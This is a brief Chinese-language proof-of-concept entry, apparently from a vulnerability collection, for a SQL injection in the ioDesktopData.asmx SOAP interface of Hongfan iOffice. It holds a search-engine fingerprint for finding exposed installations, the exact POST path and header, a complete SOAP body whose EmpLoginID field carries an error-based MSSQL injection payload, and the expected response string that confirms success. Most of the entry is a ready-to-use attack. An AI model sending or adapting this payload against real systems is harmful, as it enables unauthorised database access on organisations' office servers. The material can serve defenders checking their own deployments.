# 红帆iOfficeioDesktopData.asmx接口存在SQL注入漏洞

- **系统**：红帆iOfficeioDesktopData.asmx接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="红帆-ioffice"`
- **请求**：`POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
<soap:Header/>
<soap:Body>
<tem:GetDepSchedule>
<!--type: string-->
<tem:EmpLoginID>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(select sys.fn_varbintohexstr(hashbytes('md5','123')))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</tem:EmpLoginID>
</tem:GetDepSchedule>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　ac59075b964b0715